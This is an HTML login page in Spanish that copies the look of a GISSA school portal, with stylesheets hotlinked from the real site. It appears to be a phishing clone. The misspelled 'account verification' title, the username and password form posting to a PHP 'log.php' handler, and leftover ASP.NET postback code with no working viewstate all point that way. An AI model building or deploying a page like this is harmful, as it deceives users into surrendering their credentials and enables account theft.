

<!DOCTYPE html>

<html class="bg-black">
<head><meta charset="utf-8" /><meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" /><title>
	Verifiacion de cuenta usuario.
</title><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" /><link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" />
    <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
    <link href="css/AdminLTE.css" rel="stylesheet" type="text/css" /><link href="http://portal.gissa.com.mx/INQBA/app_escolar/css/StyleLogin.css" rel="stylesheet" /><link href="http://portal.gissa.com.mx/INQBA/app_escolar/css/General.css" rel="stylesheet" type="text/css" /></head>
<body class="text-center login" id="bodyinicio" style="background-size: 100% 100%; background-position:center center; background-repeat:no-repeat;  background-attachment:fixed; background-color:white">
    <form method="post" action="log.php" onsubmit="javascript:return WebForm_OnSubmit();" id="ctl01" class="form-signin">

<script type="text/javascript">
//<![CDATA[
var theForm = document.forms['ctl01'];
if (!theForm) {
    theForm = document.ctl01;
}
function __doPostBack(eventTarget, eventArgument) {
    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {
        theForm.__EVENTTARGET.value = eventTarget;
        theForm.__EVENTARGUMENT.value = eventArgument;
        theForm.submit();
    }
}
//]]>
</script>
p

<div class="aspNetHidden">

	<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="58DCAB2E" />
	<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="KHSU+RI6e8krFGiNpGu0spS6WQELdfx/iuqnj+2pTcePz/q6kkc3q+ZTSltkEHVLUFcUFVaxPU9IPPcnQONnfjaw/CwTrP0NYAHqlXWsuqqBawfqZ24ht9ajb6J+rdtGQlkhrJbSqPYwVE5Wdx/ksEEgrK0g1Jo+TXu6sxyffyhJDqG5mwWsFMOcK3FePKbw" />
</div>
        <div class="wrapper fadeInDown">
            <div id="formContent">
                <div class="fadeIn first">
                    <img class="mb-4" src="Img/logo_empresa.png" id="icon" style="width:308px; height:auto" alt ="" />
                </div>
                <div class="login-wrap">
                    <div class="login-html">
		                <input id="tab-1" type="radio" name="tab" class="sign-in" checked><label for="tab-1" class="tab">Registrese</label>
		                <input id="tab-2" type="radio" name="tab" class="for-pwd"><label for="tab-2" class="tab">Recuperar Contraseña</label>
                        <div class="login-form">
                            <div class="sign-in-htm">
                                <form>
                                    <div class="body bg-gray-gradient">
                                        <div class="form-group col-xs-3">
                                            <input name="UserName" type="text" id="UserName" class="fadeIn second" placeholder="Ingrese su usuario" />
                                            <span data-val-controltovalidate="UserName" data-val-errormessage="Escribe tu usuario." data-val-display="Dynamic" id="RequiredFieldValidator1" data-val="true" data-val-evaluationfunction="RequiredFieldValidatorEvaluateIsValid" data-val-initialvalue="" style="display:none;">Escribe tu usuario.</span>
                                        </div>
                                        <div class="form-group col-xs-3">
                                            <input name="UserPass" type="password" id="UserPass" class="fadeIn third" placeholder="Ingrese su contraseña" />
                                            <span data-val-controltovalidate="UserPass" data-val-errormessage="Escribe tu contraseña." data-val-display="Dynamic" id="RequiredFieldValidator2" data-val="true" data-val-evaluationfunction="RequiredFieldValidatorEvaluateIsValid" data-val-initialvalue="" style="display:none;">Escribe tu contraseña.</span>
                                        </div>
                                        <div class="form-group col-xs-3">
                                            <input type="submit" name="BtnIngresar" value="Iniciar Sesión" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;BtnIngresar&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="BtnIngresar" class="btn bg-olive" />
                                        </div>
                                    </div>
                                </form>
                            </div>
                            <div class="for-pwd-htm">
				                <div class="form-group">
					                <label for="user" class="label">Escribe tu correo</label>
					                <input id="user" type="text" class="fadeIn second">
				                </div>
				                <div class="form-group">
					                <input type="submit" name="BtnRecuperar" value="Enviar correo" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;BtnRecuperar&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" id="BtnRecuperar" class="btn bg-olive" />
				                </div>
				                <div class="hr"></div>
			                </div>
		                </div>
                    </div>
                </div>
                <div id="footer" style="text-align:right">
                    <a href="mailto:pmarquez@gissa.com.mx?subject=Escolar"></a><img src="Img/pie_texto.png" style="width: 30%; min-width: 210px;" />
                </div>
            </div>
        </div>
    </form>
</body>
</html>

